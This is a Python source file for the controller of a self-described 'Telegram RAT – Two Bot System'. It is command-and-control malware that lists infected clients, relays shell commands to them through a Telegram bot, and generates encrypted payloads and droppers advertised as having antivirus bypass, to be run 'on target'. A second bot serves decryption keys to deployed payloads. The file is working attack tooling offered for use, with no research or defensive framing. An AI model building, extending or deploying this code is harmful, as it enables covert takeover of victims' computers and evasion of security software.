"""
Telegram Bot Controller – Main bot commands + key storage.
Second bot is polled on-demand to handle key requests.
"""

import telepot
from telepot.loop import MessageLoop
import time
import sys
import threading
import tempfile
import os
import json
import urllib.request
import urllib.error
from config import TOKEN, MASTER_SECRET, SALT, PAYLOAD_BOT_TOKEN
from core.client_manager import ClientManager
from core.payload_generator import PayloadGenerator
from core.crypto import CryptoHandler

class BotController:
    def __init__(self):
        self.bot = telepot.Bot(TOKEN)

        self.client_manager = ClientManager()
        self.crypto = CryptoHandler(MASTER_SECRET, SALT)
        self.payload_gen = PayloadGenerator(MASTER_SECRET, SALT, TOKEN, PAYLOAD_BOT_TOKEN)
        self.payload_bot = telepot.Bot(PAYLOAD_BOT_TOKEN)
        self.payload_bot_offset = None
        self.running = True
        self.key_store = {}
        self.pending_keys = {}

    def handle_main_message(self, msg):
        try:
            content_type, chat_type, chat_id = telepot.glance(msg)

            if content_type == 'text':
                text = msg['text']

                if text.startswith('/'):
                    self.handle_command(chat_id, text)
                else:
                    if text.startswith('!'):
                        parts = text.split(' ', 1)
                        if len(parts) == 2:
                            client_id = parts[0][1:]
                            command = parts[1]
                            self.client_manager.handle_client_message(client_id, command, chat_id, self.bot)
                    else:
                        default = self.client_manager.get_default_client()
                        if default:
                            self.client_manager.execute_command(default, text, chat_id, self.bot)
                        else:
                            self.bot.sendMessage(chat_id, '[!] No client selected.')

            elif content_type == 'document':
                self.handle_document(msg, chat_id)

        except Exception as e:
            try:
                self.bot.sendMessage(chat_id, f'[!] Error: {e}')
            except:
                pass

    def handle_command(self, chat_id, text):
        parts = text.split(maxsplit=1)
        cmd = parts[0]
        args = parts[1] if len(parts) > 1 else ''

        if cmd == '/start':
            self.bot.sendMessage(chat_id, self.get_help())

        elif cmd == '/help':
            self.bot.sendMessage(chat_id, self.get_help())

        elif cmd == '/generate_payload':
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /generate_payload <command>')
                return
            self.bot.sendMessage(chat_id, '⏳ Generating Python payload...')
            payload, key_id, key = self.payload_gen.generate_payload(args, chat_id)
            self.send_payload(chat_id, payload, key_id, 'Python Payload', key)

        elif cmd == '/generate_dropper':
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /generate_dropper <command>')
                return
            self.bot.sendMessage(chat_id, '⏳ Generating dropper with AV bypass...')
            dropper, key_id, key = self.payload_gen.generate_dropper(args, chat_id)
            self.send_payload(chat_id, dropper, key_id, 'Python Dropper', key)

        elif cmd == '/clients':
            self.list_clients(chat_id)

        elif cmd == '/select':
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /select <client_id>')
                return
            if self.client_manager.set_default_client(args):
                self.bot.sendMessage(chat_id, f'Selected: {args}')
            else:
                self.bot.sendMessage(chat_id, f'[!] Client not found: {args}')

        elif cmd == '/getkey':
            key = self.crypto.get_current_key()
            self.bot.sendMessage(chat_id, f'Current Key: {key}')

        else:
            self.bot.sendMessage(chat_id, f'[!] Unknown command: {cmd}')

    def send_payload(self, chat_id, script, key_id, payload_type, key=None):
        try:
            if key_id:
                if key is None:
                    key = self.payload_gen.crypto.get_key(key_id)
                self.key_store[key_id] = key
                self.pending_keys[key_id] = chat_id
                print(f'[MAIN] Stored key for {key_id}: {key[:20]}...')
                print(f'[MAIN] Current key_store keys: {list(self.key_store.keys())}')

            temp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
            temp.write(script)
            temp.close()

            with open(temp.name, 'rb') as f:
                caption = f'📦 {payload_type}'
                if key_id:
                    caption += f'\nKey ID: {key_id}'
                self.bot.sendDocument(chat_id, f, caption=caption)

            os.unlink(temp.name)

            if key_id:
                self.bot.sendMessage(
                    chat_id,
                    f'🔑 Key ID: {key_id}\n\n'
                    f'The payload will send /getkey_{key_id} to the SECOND bot.\n'
                    f'Make sure the second bot is added to this chat.'
                )

            self.bot.sendMessage(
                chat_id,
                f'✅ {payload_type} generated.\nRun on target: python3 payload.py'
            )

        except Exception as e:
            self.bot.sendMessage(chat_id, f'[!] Error: {e}')

    def process_payload_bot_requests(self):
        """Poll the second bot for /getkey_<key_id> requests and reply with the stored key."""
        try:
            url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/getUpdates?limit=1&timeout=0"
            if self.payload_bot_offset is not None:
                url += f"&offset={self.payload_bot_offset}"

            req = urllib.request.Request(url)
            try:
                resp = urllib.request.urlopen(req, timeout=10)
            except urllib.error.HTTPError as e:
                if e.code == 409:
                    time.sleep(0.5)
                    return
                raise

            data = json.loads(resp.read().decode())

            if data.get('ok'):
                for update in data.get('result', []):
                    self.payload_bot_offset = update.get('update_id', self.payload_bot_offset or 0) + 1
                    msg = update.get('message', {})
                    chat_id = msg.get('chat', {}).get('id')
                    text = msg.get('text', '')

                    if text.startswith('/getkey_'):
                        key_id = text[len('/getkey_'):].strip()
                        print(f'[PAYLOAD BOT] Request for key_id: {key_id}')
                        print(f'[PAYLOAD BOT] Current key_store keys: {list(self.key_store.keys())}')
                        if key_id in self.key_store:
                            key = self.key_store[key_id]
                            self.payload_bot.sendMessage(chat_id, key)
                            print(f'[PAYLOAD BOT] Sent key for {key_id}')
                        else:
                            self.payload_bot.sendMessage(chat_id, 'ERROR: Key not found')
                            print(f'[PAYLOAD BOT] Key not found: {key_id}')
        except Exception as e:
            print(f'[PAYLOAD BOT] Error: {e}')

    def start(self):
        # Start main bot loop
        def run_main_bot():
            try:
                MessageLoop(self.bot, self.handle_main_message).run_as_thread()
                print('[+] Main bot started')
            except Exception as e:
                print(f'[!] Main bot error: {e}')

        main_thread = threading.Thread(target=run_main_bot, daemon=True)
        main_thread.start()

        # Periodic check for key requests on second bot (short poll)
        def check_second_bot():
            while self.running:
                self.process_payload_bot_requests()
                time.sleep(3)

        poll_thread = threading.Thread(target=check_second_bot, daemon=True)
        poll_thread.start()

        print('=' * 60)
        print('🤖 Telegram RAT – Two Bot System')
        print('=' * 60)
        print('Main bot:    Handles commands and payload generation (long-poll)')
        print('Second bot:  Polled every 3s for key requests (short-poll)')
        print('             No long-polling on second bot = NO CONFLICT!')
        print('Press Ctrl+C to stop.')
        print('=' * 60)

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print('\n[!] Stopping...')
            sys.exit(0)

    # ==================== HELPERS ====================
    def list_clients(self, chat_id):
        clients = self.client_manager.list_clients()
        if not clients:
            self.bot.sendMessage(chat_id, '[!] No clients connected')
            return

        msg = '📋 Connected Clients:\n\n'
        for i, c in enumerate(clients, 1):
            status = '🟢' if c.get('status') == 'online' else '🔴'
            msg += f'{status} {i}. {c["id"]} - {c.get("ip", "N/A")} - {c.get("os", "Unknown")}\n'

        self.bot.sendMessage(chat_id, msg)

    def handle_document(self, msg, chat_id):
        try:
            file_id = msg['document']['file_id']
            file_name = msg['document'].get('file_name', 'unknown.py')
            self.bot.sendMessage(chat_id, f'📁 Received: {file_name}')
        except Exception as e:
            self.bot.sendMessage(chat_id, f'[!] Error: {e}')

    def get_help(self):
        return (
            '🤖 Telegram RAT – Python Payload Generator\n\n'
            'Commands:\n'
            '/help – Show this\n'
            '/generate_payload <cmd> – Generate encrypted payload\n'
            '/generate_dropper <cmd> – Generate dropper\n'
            '/clients – List clients\n'
            '/select <id> – Select client\n'
            '/getkey – Show current key\n\n'
            'Payload sends /getkey_<KEY_ID> to the SECOND bot.\n'
            'Second bot polls every 3s and replies with the key.\n'
            'No 409 Conflict because second bot uses short-poll (no long-loop).'
        )